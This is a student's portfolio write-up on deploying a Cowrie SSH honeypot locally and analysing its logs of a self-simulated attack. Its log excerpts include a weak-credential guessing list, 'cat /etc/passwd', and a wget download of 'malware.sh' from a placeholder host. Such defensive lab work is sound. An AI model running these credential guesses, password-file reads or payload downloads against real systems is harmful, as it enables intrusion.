# Cowrie SSH Honeypot — Local Deployment

**Difficulty:** Beginner (deployment) / Intermediate (log analysis)
**Category:** Deception Technology, SOC Fundamentals
**Date completed:** 2026-09-02
**Status:** Phase 1 (local, no internet exposure). Phase 2 (cloud VPS + real attacker traffic + Wazuh integration) planned later.

## Summary

I'm working toward a SOC analyst role, and this was the first hands-on project on that path — deliberately timed to when I'd actually covered the underlying concept, honeypots, in my CompTIA Security+ study, rather than jumping ahead of what I understood. I deployed [Cowrie](https://github.com/cowrie/cowrie), a fake SSH server that logs everything an attacker does against it, locally via Docker, then simulated a realistic attack against my own honeypot to see exactly what data it captures and why it matters. This is phase one of a bigger plan — eventually I'll expose a version of this to real internet traffic from a cloud server and feed it into a home SIEM lab I'm building, but for now this was about understanding the tool and its data before scaling it up.

## What a Honeypot Actually Is

A honeypot is a fake system with no legitimate reason for anyone to touch it — so if something interacts with it, it's safe to assume that's an attacker, no guessing required. I first ran into this idea studying deception technology for Security+, where honeypots, honeynets, and honeytokens are all the same core concept: bait that only a bad actor would ever take. Cowrie goes further than a bare trip-wire honeypot, though — it doesn't just detect a connection, it fakes an entire convincing Linux shell, so once someone thinks they're in, they keep going and give up a lot more about how they actually operate than a simple detection would.

## Deployment

Docker wasn't already installed on my Kali box, so that was step one — one line from Kali's own repos, `sudo apt install docker.io`. Once that was running, standing up Cowrie itself took a single command:

```
docker run -d -p 2222:2222 --name cowrie-honeypot --restart unless-stopped cowrie/cowrie:latest
```

That pulled the official image and had it listening on port 2222, pretending to be a real SSH server, in under a minute.

## Test Methodology

Since this is running locally with nothing exposed to the internet yet, there's no real attacker traffic hitting it — so to actually see what the tool captures, I had to generate that traffic myself. I wrote a small Python script using `paramiko`, an SSH library, to:

1. Try five common weak username/password combinations against it, to see which ones it lets through. Cowrie isn't supposed to accept everything — it's built to mimic a realistic brute-force success rate — and sure enough, only some of them worked.
2. Once I was "in," I ran through a realistic recon-and-exfiltration sequence an actual attacker might run: `whoami`, `uname -a`, `ls -la /`, `cat /etc/passwd`, a `wget` of a fake payload, `ps aux`, then `exit`.

Full raw captured log is here: [`evidence/cowrie-session-log-2026-09-02.json`](../evidence/cowrie-session-log-2026-09-02.json)

## Log Analysis — What I Found and Why It Matters

Cowrie logs everything as structured JSON, one event per line — this is exactly the format a SIEM like Wazuh ingests, which is part of why I picked this as the entry point into the bigger lab I'm planning.

**1. Connection and client fingerprinting** — Every connection logs the source IP and port, plus something called a hassh fingerprint, a hash of the client's SSH settings. Two different attack tools, or even two versions of the same tool, tend to produce different hassh values — meaning I could start grouping activity by who's actually behind it before even looking at what they typed.

**2. Credential attempts:**
```
login attempt [root/123456] failed
login attempt [root/root] failed
login attempt [root/toor] succeeded
login attempt [admin/admin] succeeded
login attempt [root/password] succeeded
login attempt [test/test] succeeded
```
Watching this happen, it's a textbook credential-stuffing pattern: a handful of the most common weak passwords, fired off back to back, several landing. What stood out to me is that in a real SOC seat, you wouldn't even need to know what happened after the login to flag this — several successful logins against the same box in under a second is the alarm bell by itself.

**3. Full command session:**
```
CMD: whoami
CMD: uname -a
CMD: ls -la /
CMD: cat /etc/passwd
CMD: wget http://example.com/malware.sh
CMD: ps aux
CMD: exit
```
Reading this back was honestly the coolest part. It's not abstract, it's a straight narrative: figure out who you are, fingerprint the box, look around, grab the password file, pull down a second payload, check what's running. I didn't have to interpret intent — the log just tells the story.

**4. File download capture:**
```
Downloaded URL (http://example.com/malware.sh) with SHA-256 ff67a9d7...
```
This one actually surprised me. I expected the `wget` command to just show up as a line of text, but Cowrie caught the file itself and hashed it. That's the exact hook a SIEM would use to check a file against VirusTotal automatically — seeing it happen live made the whole "why hashes matter" idea click in a way just reading about it hadn't.

**5. TTY session recording** — On top of the JSON log, the whole terminal session got saved as a replayable recording too. So beyond just reading log lines, I could actually play the session back and watch it happen exactly as it did.

## What This Demonstrates

- I understand deception technology as a real detection mechanism, not just a Security+ exam term (Domain 1.2).
- I can deploy and configure a real security tool from scratch, not just read about how it works.
- I'm comfortable reading and interpreting structured security logs — connection metadata, auth events, command telemetry, file capture — which is the core daily task of a SOC analyst.
- This is a real artifact: my own captured JSON logs, not a screenshot from someone else's tutorial.

## Next Steps

- Deploy this same honeypot on a cloud VPS so it's catching genuine internet attackers instead of my own simulated sessions.
- Forward its logs into the home Wazuh SIEM I'm building next, so I can practice real-time alerting and triage instead of manually reading a JSON file.
